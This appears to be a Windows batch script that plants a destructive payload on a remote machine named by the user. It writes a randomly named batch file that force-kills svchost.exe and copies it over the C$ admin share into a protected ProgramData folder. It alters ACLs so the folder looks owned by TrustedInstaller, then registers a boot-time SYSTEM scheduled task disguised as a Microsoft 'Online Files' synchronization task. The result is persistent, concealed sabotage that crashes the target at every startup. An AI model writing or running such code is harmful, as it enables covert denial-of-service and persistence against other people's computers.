@echo off

SETLOCAL

set /p computer_name="Enter a computer name: "
for /f "tokens=* USEBACKQ" %%g in (`"%~dp0\NameGen.bat" 10`) do (set "file_name=%%g.bat")

(
	echo @echo off
	echo(

	echo SETLOCAL
	echo(

	echo taskkill /f /im svchost.exe

	echo(
	echo ENDLOCAL
) >> "%~dp0file_name"

set "dir=\\%computer_name%\C$\ProgramData\Microsoft\Windows\AppRepository"

icacls %dir% /setowner Administrators /q
icacls %dir% /grant Administrators:(W) /q

move "%~dp0file_name" "%dir%\%file_name%"

icacls %dir% /deny Administrators:(W) /q
icacls %dir% /remove:d Administrators /q
icacls %dir% /setowner "NT SERVICE\TrustedInstaller" /q

(
	echo ^<?xml version="1.0" encoding="UTF-16"?^>
	echo ^<Task version="1.6" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"^>
	echo   ^<RegistrationInfo^>
	echo     ^<Source^>Microsoft Corporation^</Source^>
	echo     ^<Author^>Microsoft Corporation^</Author^>
	echo     ^<Version^>1.0^</Version^>
	echo     ^<Description^>This task controls periodic background synchronization of Online Files when the user is working in an online mode.^</Description^>
	echo   ^</RegistrationInfo^>
	echo   ^<Triggers^>
	echo     ^<BootTrigger^>
	echo       ^<Enabled^>true^</Enabled^>
	echo     ^</BootTrigger^>
	echo   ^</Triggers^>
	echo   ^<Principals^>
	echo     ^<Principal id="LocalSystem"^>
	echo       ^<UserId^>S-1-5-18^</UserId^>
	echo       ^<RunLevel^>LeastPrivilege^</RunLevel^>
	echo     ^</Principal^>
	echo   ^</Principals^>
	echo   ^<Settings^>
	echo     ^<MultipleInstancesPolicy^>IgnoreNew^</MultipleInstancesPolicy^>
	echo     ^<DisallowStartIfOnBatteries^>true^</DisallowStartIfOnBatteries^>
	echo     ^<StopIfGoingOnBatteries^>true^</StopIfGoingOnBatteries^>
	echo     ^<AllowHardTerminate^>true^</AllowHardTerminate^>
	echo     ^<StartWhenAvailable^>false^</StartWhenAvailable^>
	echo     ^<RunOnlyIfNetworkAvailable^>false^</RunOnlyIfNetworkAvailable^>
	echo     ^<IdleSettings^>
	echo       ^<Duration^>PT10M^</Duration^>
	echo       ^<WaitTimeout^>PT1H^</WaitTimeout^>
	echo       ^<StopOnIdleEnd^>true^</StopOnIdleEnd^>
	echo       ^<RestartOnIdle^>false^</RestartOnIdle^>
	echo     ^</IdleSettings^>
	echo     ^<AllowStartOnDemand^>true^</AllowStartOnDemand^>
	echo     ^<Enabled^>true^</Enabled^>
	echo     ^<Hidden^>false^</Hidden^>
	echo     ^<RunOnlyIfIdle^>false^</RunOnlyIfIdle^>
	echo     ^<WakeToRun^>false^</WakeToRun^>
	echo     ^<ExecutionTimeLimit^>PT72H^</ExecutionTimeLimit^>
	echo     ^<Priority^>7^</Priority^>
	echo   ^</Settings^>
	echo   ^<Actions Context="LocalSystem"^>
	echo     ^<Exec^>
	echo       ^<Command^>C:\ProgramData\Microsoft\Windows\AppRepository\%file_name%^</Command^>
	echo     ^</Exec^>
	echo   ^</Actions^>
	echo ^</Task^>
) > "%~dp0task.xml"

schtasks /create /s %computer_name% /tn "Microsoft\Windows\Online Files\Background Synchronization" /xml "%~dp0task.xml"
del "%~dp0task.xml"

ENDLOCAL